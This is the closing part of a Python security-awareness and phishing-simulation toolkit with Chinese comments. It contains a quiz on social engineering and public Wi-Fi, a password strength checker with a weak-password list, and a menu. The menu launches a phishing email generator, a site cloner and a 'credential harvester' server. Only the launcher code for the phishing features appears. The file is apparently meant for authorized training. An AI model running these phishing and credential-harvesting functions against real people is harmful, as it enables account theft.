        },
        {
            'category': '社会工程学',
            'difficulty': '困难',
            'question': '有人在公司入口处说忘带门禁卡，'
                       '请求您帮忙开门。以下哪种做法最安全？',
            'options': [
                'A. 既然是同事，帮忙开门',
                'B. 要求对方出示工牌验证身份',
                'C. 让对方联系前台或保安处理',
                'D. B和C都是正确的'
            ],
            'answer': 'D',
            'explanation': '尾随(tailgating)是常见的物理社会工程攻击。'
                          '应该要求对方出示工牌或引导其联系前台/保安处理，'
                          '而不是直接帮忙开门。'
        },
        # 移动安全类
        {
            'category': '移动安全',
            'difficulty': '简单',
            'question': '在咖啡店使用公共Wi-Fi时，'
                       '以下哪种做法最安全？',
            'options': [
                'A. 直接连接公共Wi-Fi进行所有操作',
                'B. 连接公共Wi-Fi但使用VPN',
                'C. 使用手机热点代替公共Wi-Fi',
                'D. B和C都是安全的选择'
            ],
            'answer': 'D',
            'explanation': '公共Wi-Fi存在被监听的风险。'
                          '使用VPN可以加密通信，'
                          '使用手机热点则完全避免了公共Wi-Fi的风险。'
        },
    ]

    def __init__(self):
        """初始化问卷系统"""
        self.questions = self.QUESTION_BANK.copy()
        self.score = 0
        self.results = []
        self.categories = list(set(q['category'] for q in self.questions))

    def add_custom_question(self, question, options, answer,
                            category='自定义', difficulty='中等',
                            explanation=''):
        """添加自定义题目"""
        self.questions.append({
            'category': category,
            'difficulty': difficulty,
            'question': question,
            'options': options,
            'answer': answer,
            'explanation': explanation
        })

    def run_quiz(self, categories=None, num_questions=None):
        """
        运行安全意识测试

        参数:
            categories: 限定题目类别（None表示所有类别）
            num_questions: 题目数量（None表示全部）

        返回:
            测试结果和评估报告
        """
        # 筛选题目
        questions = self.questions
        if categories:
            questions = [q for q in questions
                        if q['category'] in categories]
        if num_questions and num_questions < len(questions):
            random.shuffle(questions)
            questions = questions[:num_questions]

        print("\n" + "=" * 50)
        print("    安全意识知识测试")
        print("=" * 50)
        print(f"\n共 {len(questions)} 道题，请仔细阅读后选择答案。\n")

        self.score = 0
        self.results = []

        for i, q in enumerate(questions, 1):
            print(f"\n第 {i} 题 [{q['category']} | {q['difficulty']}]")
            print(f"  {q['question']}\n")
            for option in q['options']:
                print(f"  {option}")

            # 获取用户答案
            while True:
                answer = input("\n  请选择 (A/B/C/D): ").strip().upper()
                if answer in ['A', 'B', 'C', 'D']:
                    break
                print("  请输入 A、B、C 或 D")

            # 判断对错
            correct = answer == q['answer']
            if correct:
                self.score += 1
                print("  ✓ 回答正确!")
            else:
                print(f"  ✗ 回答错误。正确答案: {q['answer']}")

            print(f"  解析: {q['explanation']}")

            self.results.append({
                'question': q['question'],
                'category': q['category'],
                'user_answer': answer,
                'correct_answer': q['answer'],
                'is_correct': correct,
                'explanation': q['explanation']
            })

        # 生成结果
        return self.generate_quiz_report()

    def generate_quiz_report(self):
        """生成测试结果报告"""
        total = len(self.results)
        correct = self.score
        wrong = total - correct
        percentage = round(correct / total * 100, 1) if total else 0

        # 按类别统计
        category_stats = defaultdict(lambda: {'correct': 0, 'total': 0})
        for r in self.results:
            cat = r['category']
            category_stats[cat]['total'] += 1
            if r['is_correct']:
                category_stats[cat]['correct'] += 1

        # 评级
        if percentage >= 90:
            grade = 'A (优秀)'
            assessment = '安全意识水平优秀，继续保持!'
        elif percentage >= 75:
            grade = 'B (良好)'
            assessment = '安全意识水平良好，部分领域可以加强。'
        elif percentage >= 60:
            grade = 'C (及格)'
            assessment = '安全意识水平一般，需要加强培训。'
        else:
            grade = 'D (需改进)'
            assessment = '安全意识水平不足，建议立即参加安全培训。'

        report = f"""
{'=' * 50}
    安全意识测试结果
{'=' * 50}

答题总数: {total}
正确: {correct}
错误: {wrong}
得分: {percentage}%
评级: {grade}

评估: {assessment}

{'─' * 50}
分类统计:
"""
        for cat, stats in category_stats.items():
            rate = round(stats['correct'] / stats['total'] * 100, 1)
            report += f"  {cat}: {stats['correct']}/{stats['total']} ({rate}%)\n"

        # 显示错误题目
        wrong_questions = [r for r in self.results if not r['is_correct']]
        if wrong_questions:
            report += f"\n{'─' * 50}\n"
            report += f"答错的题目 ({len(wrong_questions)}题):\n"
            report += f"{'─' * 50}\n"
            for r in wrong_questions:
                report += f"\n  题目: {r['question'][:50]}...\n"
                report += f"  你的答案: {r['user_answer']}\n"
                report += f"  正确答案: {r['correct_answer']}\n"
                report += f"  解析: {r['explanation'][:80]}...\n"

        report += f"\n{'=' * 50}\n"

        return {
            'report': report,
            'score': percentage,
            'grade': grade,
            'assessment': assessment,
            'category_stats': dict(category_stats),
            'total_questions': total,
            'correct_answers': correct
        }


# ============================================================
# 模块6: 密码强度评估工具
# ============================================================

class PasswordStrengthEvaluator:
    """
    密码强度评估工具

    功能:
        - 评估密码强度（长度、复杂度、字符多样性）
        - 检测常见弱密码模式
        - 检测密码中包含的个人信息
        - 估算密码破解时间
        - 生成密码改进建议
        - 生成强密码建议

    使用场景:
        - 安全培训中演示密码安全
        - 密码策略合规检查
        - 用户密码安全教育
    """

    # 常见弱密码列表（示例，实际应使用完整列表）
    COMMON_WEAK_PASSWORDS = [
        '123456', '123456789', 'password', 'qwerty', 'abc123',
        '12345678', '111111', '1234567', 'admin', 'letmein',
        'welcome', 'monkey', '1234567890', 'password1',
        '123123', '000000', 'iloveyou', '1234', '1q2w3e4r',
        'p@ssw0rd', 'passwd', '12345', 'admin123', 'root',
        'test', 'guest', 'changeme', 'master', 'superman',
    ]

    # 常见键盘模式
    KEYBOARD_PATTERNS = [
        'qwerty', 'asdfgh', 'zxcvbn', 'qazwsx', '1234',
        'abcd', '09876', '1qaz', '2wsx', 'zaq1',
    ]

    def __init__(self):
        """初始化密码评估器"""
        self.results = {}

    def evaluate(self, password, personal_info=None):
        """
        评估密码强度

        参数:
            password: 要评估的密码
            personal_info: 个人信息字典，用于检测密码中是否
                          包含个人信息，如:
                          {'name': '张三', 'birthday': '19900101',
                           'phone': '13800138000', 'company': 'ABC'}

        返回:
            评估结果字典，包含:
            - strength: 强度等级（很弱/弱/中/强/很强）
            - score: 评分(0-100)
            - findings: 发现的问题列表
            - crack_time: 预估破解时间
            - suggestions: 改进建议
        """
        findings = []
        score = 0
        max_score = 100

        # 检测1: 密码长度
        length = len(password)
        if length >= 16:
            score += 25
        elif length >= 12:
            score += 20
        elif length >= 8:
            score += 10
            findings.append({
                'type': 'length',
                'severity': 'medium',
                'message': f'密码长度({length})不足，建议至少12位'
            })
        else:
            findings.append({
                'type': 'length',
                'severity': 'high',
                'message': f'密码长度({length})过短，极易被破解'
            })

        # 检测2: 字符多样性
        has_lower = bool(re.search(r'[a-z]', password))
        has_upper = bool(re.search(r'[A-Z]', password))
        has_digit = bool(re.search(r'[0-9]', password))
        has_special = bool(re.search(r'[!@#$%^&*()_+\-=\[\]{};\':"|,.<>/?`~]', password))

        char_types = sum([has_lower, has_upper, has_digit, has_special])

        if char_types == 4:
            score += 25
        elif char_types == 3:
            score += 18
        elif char_types == 2:
            score += 10
            findings.append({
                'type': 'complexity',
                'severity': 'medium',
                'message': '字符类型不足，建议包含大小写字母、数字和特殊字符'
            })
        else:
            findings.append({
                'type': 'complexity',
                'severity': 'high',
                'message': '字符类型单一，极易被字典攻击破解'
            })

        # 检测3: 是否在常见弱密码列表中
        if password.lower() in self.COMMON_WEAK_PASSWORDS:
            score -= 30
            findings.append({
                'type': 'common',
                'severity': 'critical',
                'message': '该密码在常见弱密码列表中，会被优先尝试'
            })

        # 检测4: 键盘模式检测
        password_lower = password.lower()
        for pattern in self.KEYBOARD_PATTERNS:
            if pattern in password_lower:
                score -= 15
                findings.append({
                    'type': 'pattern',
                    'severity': 'high',
                    'message': f'密码包含键盘模式 "{pattern}"，容易被破解'
                })
                break

        # 检测5: 顺序/重复字符
        # 顺序字符（如1234, abcd）
        sequential = 0
        for i in range(len(password) - 1):
            if ord(password[i + 1]) - ord(password[i]) == 1:
                sequential += 1
        if sequential >= 3:
            score -= 10
            findings.append({
                'type': 'sequential',
                'severity': 'medium',
                'message': f'密码包含{sequential + 1}个顺序字符'
            })

        # 重复字符（如aaaa, 1111）
        repeats = 0
        for i in range(len(password) - 1):
            if password[i] == password[i + 1]:
                repeats += 1
        if repeats >= 3:
            score -= 10
            findings.append({
                'type': 'repeat',
                'severity': 'medium',
                'message': f'密码包含{repeats + 1}个重复字符'
            })

        # 检测6: 个人信息检测
        if personal_info:
            for info_type, info_value in personal_info.items():
                if info_value and len(str(info_value)) >= 3:
                    if str(info_value).lower() in password_lower:
                        score -= 20
                        findings.append({
                            'type': 'personal_info',
                            'severity': 'high',
                            'message': f'密码包含个人信息({info_type})，'
                                      f'容易被社会工程攻击猜出'
                        })

        # 确保分数在0-100范围内
        score = max(0, min(100, score))

        # 计算字符集大小（用于估算破解时间）
        charset_size = 0
        if has_lower:
            charset_size += 26
        if has_upper:
            charset_size += 26
        if has_digit:
            charset_size += 10
        if has_special:
            charset_size += 32

        # 估算破解时间
        # 假设攻击速度: 100亿次/秒（现代GPU集群）
        if charset_size > 0:
            combinations = charset_size ** length
            crack_seconds = combinations / 10e9
            crack_time = self._format_time(crack_seconds)
        else:
            crack_time = '瞬间'

        # 强度等级
        if score >= 80:
            strength = '很强'
        elif score >= 60:
            strength = '强'
        elif score >= 40:
            strength = '中'
        elif score >= 20:
            strength = '弱'
        else:
            strength = '很弱'

        # 改进建议
        suggestions = self._generate_suggestions(
            password, findings, length, char_types
        )

        self.results = {
            'password_length': length,
            'strength': strength,
            'score': score,
            'char_types': {
                'lowercase': has_lower,
                'uppercase': has_upper,
                'digits': has_digit,
                'special': has_special
            },
            'findings': findings,
            'estimated_crack_time': crack_time,
            'suggestions': suggestions
        }

        return self.results

    def _format_time(self, seconds):
        """格式化时间显示"""
        if seconds < 1:
            return '瞬间'
        elif seconds < 60:
            return f'{int(seconds)}秒'
        elif seconds < 3600:
            return f'{int(seconds / 60)}分钟'
        elif seconds < 86400:
            return f'{int(seconds / 3600)}小时'
        elif seconds < 31536000:
            return f'{int(seconds / 86400)}天'
        elif seconds < 31536000 * 100:
            return f'{int(seconds / 31536000)}年'
        elif seconds < 31536000 * 1e6:
            return f'{int(seconds / 31536000 / 100)}百年'
        elif seconds < 31536000 * 1e9:
            return f'{int(seconds / 31536000 / 1e6)}百万年'
        else:
            return '宇宙年龄级别'

    def _generate_suggestions(self, password, findings, length, char_types):
        """生成密码改进建议"""
        suggestions = []

        if length < 12:
            suggestions.append('增加密码长度至12位以上（建议16位+）')

        if char_types < 3:
            suggestions.append('使用大小写字母、数字和特殊字符的组合')

        if not any(f['type'] == 'common' for f in findings):
            pass  # 不在常见弱密码列表中
        else:
            suggestions.append('避免使用常见弱密码')

        # 检查是否为密码短语
        if length >= 16 and char_types >= 3 and not findings:
            suggestions.append('当前密码强度很高，可以继续保持')
        else:
            suggestions.append('考虑使用密码短语(passphrase)，'
                             '如: MyBlueCar#IsFast2026!')

        suggestions.append('每个账户使用不同密码，配合密码管理器使用')
        suggestions.append('为重要账户启用多因素认证(MFA)')

        return suggestions

    def generate_strong_password(self, length=16):
        """
        生成强密码

        参数:
            length: 密码长度（默认16位）

        返回:
            随机生成的强密码
        """
        # 确保包含所有字符类型
        lower = string.ascii_lowercase
        upper = string.ascii_uppercase
        digits = string.digits
        special = '!@#$%^&*()_+-=[]{}|;:,.<>?'

        # 每种类型至少1个字符
        password = [
            random.choice(lower),
            random.choice(upper),
            random.choice(digits),
            random.choice(special)
        ]

        # 填充剩余长度
        all_chars = lower + upper + digits + special
        for _ in range(length - 4):
            password.append(random.choice(all_chars))

        # 打乱顺序
        random.shuffle(password)

        return ''.join(password)

    def generate_report(self):
        """生成评估报告文本"""
        if not self.results:
            return "请先评估密码"

        r = self.results
        report = f"""
{'=' * 50}
    密码强度评估报告
{'=' * 50}

密码长度: {r['password_length']} 位
强度等级: {r['strength']}
安全评分: {r['score']}/100

字符组成:
  小写字母: {'✓' if r['char_types']['lowercase'] else '✗'}
  大写字母: {'✓' if r['char_types']['uppercase'] else '✗'}
  数字:     {'✓' if r['char_types']['digits'] else '✗'}
  特殊字符: {'✓' if r['char_types']['special'] else '✗'}

预估破解时间: {r['estimated_crack_time']}
"""
        if r['findings']:
            report += f"\n发现的问题:\n"
            for f in r['findings']:
                report += f"  [{f['severity']}] {f['message']}\n"

        if r['suggestions']:
            report += f"\n改进建议:\n"
            for s in r['suggestions']:
                report += f"  * {s}\n"

        report += f"\n{'=' * 50}\n"

        return report


# ============================================================
# 主程序入口
# ============================================================

def print_banner():
    """打印工具横幅"""
    banner = """
╔══════════════════════════════════════════════════════════╗
║        社会工程学与安全意识工具包 v1.0                       ║
║        Social Engineering & Security Awareness Toolkit     ║
║                                                            ║
║  功能模块:                                                  ║
║    1. OSINT信息收集工具                                     ║
║    2. 钓鱼邮件生成器框架                                    ║
║    3. 钓鱼网站克隆工具框架                                  ║
║    4. 钓鱼模拟报告生成器                                    ║
║    5. 安全意识测试问卷系统                                  ║
║    6. 密码强度评估工具                                      ║
║                                                            ║
║  重要: 本工具仅用于授权安全评估和教育目的                   ║
╚══════════════════════════════════════════════════════════╝
"""
    print(banner)


def interactive_menu():
    """交互式主菜单"""
    print_banner()

    while True:
        print("\n请选择功能模块:")
        print("  1. OSINT信息收集")
        print("  2. 钓鱼邮件生成器")
        print("  3. 钓鱼网站克隆工具")
        print("  4. 钓鱼模拟报告生成")
        print("  5. 安全意识测试")
        print("  6. 密码强度评估")
        print("  0. 退出")

        choice = input("\n请输入选项 (0-6): ").strip()

        if choice == '1':
            run_osint()
        elif choice == '2':
            run_email_generator()
        elif choice == '3':
            run_website_cloner()
        elif choice == '4':
            run_report_generator()
        elif choice == '5':
            run_quiz()
        elif choice == '6':
            run_password_evaluator()
        elif choice == '0':
            print("\n感谢使用，再见!")
            break
        else:
            print("无效选项，请重新输入")


def run_osint():
    """运行OSINT信息收集"""
    print("\n--- OSINT信息收集 ---")
    domain = input("请输入目标域名 (如 example.com): ").strip()
    if not domain:
        print("域名不能为空")
        return

    collector = OSINTCollector(domain)
    collector.run_all()
    print(collector.generate_report())


def run_email_generator():
    """运行钓鱼邮件生成器"""
    print("\n--- 钓鱼邮件生成器 ---")
    generator = PhishingEmailGenerator()

    # 列出可用模板
    generator.list_templates()

    template_key = input("\n请选择模板键名: ").strip()
    if template_key not in generator.templates:
        print("模板不存在")
        return

    # 收集变量
    first_name = input("目标姓名 (可选): ").strip() or '同事'
    phishing_url = input("钓鱼链接URL: ").strip() or 'http://example.com/login'
    tracking_pixel = input("跟踪像素URL (可选): ").strip() \
        or 'http://example.com/track.png'

    variables = {
        'first_name': first_name,
        'phishing_url': phishing_url,
        'tracking_pixel': tracking_pixel,
        'sender_name': input("发件人名称 (可选): ").strip() or '同事',
        'document_name': input("文档名称 (可选): ").strip() or '共享文档.docx',
        'tracking_number': input("快递单号 (可选): ").strip() or 'SF1234567890',
        'invoice_number': input("发票号 (可选): ").strip() or 'INV-2026-001',
        'amount': input("金额 (可选): ").strip() or '12,800',
        'due_date': input("到期日 (可选): ").strip() or '2026-09-30',
        'supplier_name': input("供应商名称 (可选): ").strip() or '供应商A',
    }

    email = generator.generate_phishing_email(template_key, variables)
    print(f"\n生成的邮件:")
    print(f"  主题: {email['subject']}")
    print(f"  分类: {email['category']}")
    print(f"  难度: {email['difficulty']}")
    print(f"\n  HTML内容前200字符:")
    print(f"  {email['html_body'][:200]}...")

    # 发件人伪装检测
    sender_email = input("\n请输入发件人邮箱 (检测伪装): ").strip()
    if sender_email:
        sender_name = input("发件人显示名 (可选): ").strip()
        analysis = generator.analyze_sender(sender_email, sender_name)
        print(f"\n发件人分析结果:")
        print(f"  风险等级: {analysis['risk_level']}")
        print(f"  风险评分: {analysis['risk_score']}")
        if analysis['findings']:
            print(f"  发现:")
            for f in analysis['findings']:
                print(f"    [{f['severity']}] {f['detail']}")


def run_website_cloner():
    """运行网站克隆工具"""
    print("\n--- 钓鱼网站克隆工具 ---")
    print("注意: 仅用于授权安全评估!")
    url = input("请输入要克隆的URL: ").strip()
    if not url:
        print("URL不能为空")
        return

    cloner = WebsiteCloner(url)
    success = cloner.clone(inject_education=True)
    if success:
        print("\n克隆成功! 文件已保存到 cloned_sites/ 目录")
        print("可使用凭证收集服务器启动:")
        print("  python social_engineering_toolkit.py --serve")


def run_report_generator():
    """运行报告生成器"""
    print("\n--- 钓鱼模拟报告生成器 ---")
    generator = PhishingReportGenerator()

    # 添加示例数据
    sample_results = [
        {'email': 'user1@company.com', 'name': '张三',
         'department': '研发部', 'sent': True,
         'opened': True, 'clicked': False, 'submitted': False, 'reported': True},
        {'email': 'user2@company.com', 'name': '李四',
         'department': '财务部', 'sent': True,
         'opened': True, 'clicked': True, 'submitted': True, 'reported': False},
        {'email': 'user3@company.com', 'name': '王五',
         'department': '研发部', 'sent': True,
         'opened': False, 'clicked': False, 'submitted': False, 'reported': False},
        {'email': 'user4@company.com', 'name': '赵六',
         'department': '财务部', 'sent': True,
         'opened': True, 'clicked': False, 'submitted': False, 'reported': True},
        {'email': 'user5@company.com', 'name': '孙七',
         'department': '销售部', 'sent': True,
         'opened': True, 'clicked': True, 'submitted': False, 'reported': False},
    ]

    generator.add_campaign_results('2026Q3安全意识评估', sample_results)
    report = generator.generate_text_report()
    print(report)

    # 导出JSON
    generator.export_json('phishing_report.json')


def run_quiz():
    """运行安全意识测试"""
    print("\n--- 安全意识测试 ---")
    quiz = SecurityAwarenessQuiz()
    result = quiz.run_quiz()
    print(result['report'])


def run_password_evaluator():
    """运行密码强度评估"""
    print("\n--- 密码强度评估 ---")
    password = getpass.getpass("请输入要评估的密码 (输入不可见): ")
    if not password:
        print("密码不能为空")
        return

    evaluator = PasswordStrengthEvaluator()
    result = evaluator.evaluate(password)
    print(evaluator.generate_report())

    # 生成强密码建议
    print("\n强密码建议:")
    for i in range(3):
        print(f"  建议{i+1}: {evaluator.generate_strong_password()}")


def start_server():
    """启动凭证收集服务器"""
    print("\n--- 启动凭证收集服务器 ---")
    print("注意: 仅用于授权安全评估!")
    port = int(input("监听端口 (默认8080): ").strip() or "8080")

    print(f"服务器启动在 http://localhost:{port}")
    print("按 Ctrl+C 停止服务器")

    server = HTTPServer(('0.0.0.0', port), CredentialHarvesterServer)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n服务器已停止")
        server.server_close()


# ============================================================
# 程序入口
# ============================================================

if __name__ == '__main__':
    import sys

    # 命令行参数处理
    if len(sys.argv) > 1:
        if sys.argv[1] == '--serve':
            start_server()
        elif sys.argv[1] == '--help':
            print_banner()
            print("用法:")
            print("  python social_engineering_toolkit.py           # 交互式菜单")
            print("  python social_engineering_toolkit.py --serve   # 启动凭证收集服务器")
            print("  python social_engineering_toolkit.py --help    # 显示帮助")
        else:
            print(f"未知参数: {sys.argv[1]}")
            print("使用 --help 查看帮助")
    else:
        # 交互式菜单
        interactive_menu()
